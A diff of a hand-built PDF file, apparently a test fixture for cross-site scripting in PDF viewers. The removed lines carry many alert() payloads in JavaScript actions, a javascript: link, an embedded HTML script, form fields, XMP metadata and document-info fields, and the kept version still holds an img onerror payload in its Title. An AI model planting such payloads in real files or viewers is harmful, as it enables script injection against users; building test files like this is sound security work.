@@ -1,16 +1,8 @@
 %PDF-1.4
-%âãÏÓ
-
 1 0 obj
 <<
   /Type /Catalog
   /Pages 2 0 R
-  /OpenAction 10 0 R
-  /AcroForm 11 0 R
-  /Metadata 12 0 R
-  /PageLabels << /Nums [ 0 << /S /D /P (<script>alert('label')</script>) >> ] >>
-  /StructTreeRoot << /K [ << /S /P /T ("><img src=x onerror=alert('struct')>) >> ] >>
-  /Names << /JavaScript [(fake) 13 0 R] >>
 >>
 endobj
 
@@ -28,147 +20,41 @@ endobj
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
-  /Annots [5 0 R]
-  /Resources << /Font << /F1 6 0 R >> >>
 >>
 endobj
 
 4 0 obj
-<< /Length 55 >>
+<< /Length 44 >>
 stream
 BT
 /F1 24 Tf
 100 700 Td
-(XSS Payload PDF.js v3) Tj
+(XSS Test PDF) Tj
 ET
 endstream
 endobj
 
 5 0 obj
 <<
-  /Type /Annot
-  /Subtype /Link
-  /Rect [100 600 300 620]
-  /Border [0 0 0]
-  /A <<
-    /S /URI
-    /URI (javascript:alert("uriXSS"))
-  >>
->>
-endobj
-
-6 0 obj
-<<
-  /Type /Font
-  /Subtype /Type1
-  /BaseFont /Helvetica
->>
-endobj
-
-7 0 obj
-<<
-  /Type /Filespec
-  /F (x.html)
-  /EF << /F 8 0 R >>
->>
-endobj
-
-8 0 obj
-<< /Length 38 >>
-stream
-<script>alert('embedded')</script>
-endstream
-endobj
-
-9 0 obj
-<<
-  /EmbeddedFiles <<
-    /Names [(x.html) 7 0 R]
-  >>
->>
-endobj
-
-10 0 obj
-<<
-  /S /JavaScript
-  /JS (app.alert("openactionXSS"))
->>
-endobj
-
-11 0 obj
-<<
-  /Fields [14 0 R]
->>
-endobj
-
-14 0 obj
-<<
-  /FT /Tx
-  /T (<svg/onload=alert('formT')>)
-  /V ("><script>alert('formV')</script>)
-  /DA (/Helv 0 Tf 0 g)
->>
-endobj
-
-12 0 obj
-<<
-  /Type /Metadata
-  /Subtype /XML
-  /Length 160
->>
-stream
-<?xpacket begin='﻿' id='W5M0MpCehiHzreSzNTczkc9d'?>
-<x:xmpmeta xmlns:x="adobe:ns:meta/">
-  <x:xmpmeta>
-    <foo>
-      <bar><![CDATA[<script>alert('xmp')</script>]]></bar>
-    </foo>
-  </x:xmpmeta>
-<?xpacket end='r'?>
-endstream
-endobj
-
-13 0 obj
-<<
-  /S /JavaScript
-  /JS (alert("NamesXSS"))
->>
-endobj
-
-15 0 obj
-<<
-  /Producer (evil.pdf)
-  /Title (<img src=x onerror=alert("Title")>)
-  /Author (<svg/onload=alert("Author")>)
-  /Subject (<script>alert("Subject")</script>)
-  /Keywords ("><script>alert('KW')</script>)
+  /Title (<img src=x onerror=alert(1337)>)
+  /Producer (ExploitPDF)
 >>
 endobj
 
 xref
-0 16
+0 6
 0000000000 65535 f 
 0000000010 00000 n 
-0000000158 00000 n 
+0000000063 00000 n 
+0000000128 00000 n 
 0000000224 00000 n 
-0000000399 00000 n 
-0000000501 00000 n 
-0000000610 00000 n 
-0000000673 00000 n 
-0000000770 00000 n 
-0000000848 00000 n 
-0000000916 00000 n 
-0000000991 00000 n 
-0000001045 00000 n 
-0000001304 00000 n 
-0000001375 00000 n 
-0000001493 00000 n 
+0000000337 00000 n 
 trailer
 <<
+  /Size 6
   /Root 1 0 R
-  /Info 15 0 R
-  /Size 16
+  /Info 5 0 R
 >>
 startxref
-1610
+421
 %%EOF
